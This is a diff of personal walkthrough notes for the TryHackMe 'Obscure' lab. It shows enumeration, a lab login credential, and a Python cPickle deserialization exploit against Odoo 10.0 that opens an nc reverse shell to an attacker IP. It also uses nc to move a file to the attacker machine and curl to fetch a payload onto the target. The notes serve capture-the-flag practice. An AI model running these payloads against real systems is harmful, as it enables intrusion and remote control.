@@ -3,9 +3,9 @@ Obscure TryHackMe
 
 Enumeration:
 
-nmap -sV -sC -v -p- 10.10.112.151 -oN nmap_s.txt
+nmap -sV -sC -v -p- 10.10.208.104 
 
-ftp 10.10.112.151
+ftp 10.10.208.104 
 
 cat notice.txt
 
@@ -21,14 +21,7 @@ email: admin@antisoft.thm
 
 Password: SecurePassword123!
 
-Go to settings
-sear
-
 searchsploit Odoo 10.0
-
-searchsploit -m 44064.md
-
-cat 44064.md
 
 search “Database Anonymization”:
 
@@ -40,7 +33,7 @@ After clicking reload the page:
 
 set up Pickle script:
 
-nano 44064.py
+nano exp.py
 
 import cPickle
 import os
@@ -49,12 +42,12 @@ import pickletools
 
 class Exploit(object):
  def __reduce__(self):
-  return (os.system, (("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.18.34.172 4444 >/tmp/f"),))
+  return (os.system, (("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.8.88 1234 >/tmp/f"),))
 
 with open("exploit.pickle", "wb") as f:
  cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
 
-python2.7 44064.py
+python2.7 exp.py
 
 set listenner:
 
@@ -66,11 +59,11 @@ In your machine:
 
 download ret
 
-nc -l -p 6666 -q 1 > ret
+nc -l -p 1337 -q 1 > ret
 
 in Reverse_shel:l
 
-cat ret | nc YOUR_MACHINE_IP 6666
+cat ret | nc 10.10.8.88 1337
 
 script to pwn:
 
@@ -122,7 +115,7 @@ In reverse_shell:
 
 cd /tmp
 
-curl http:// Your_Machine_ip/payload -o payload
+curl http://10.10.8.88/payload -o payload
 
 After downloading the file run
 
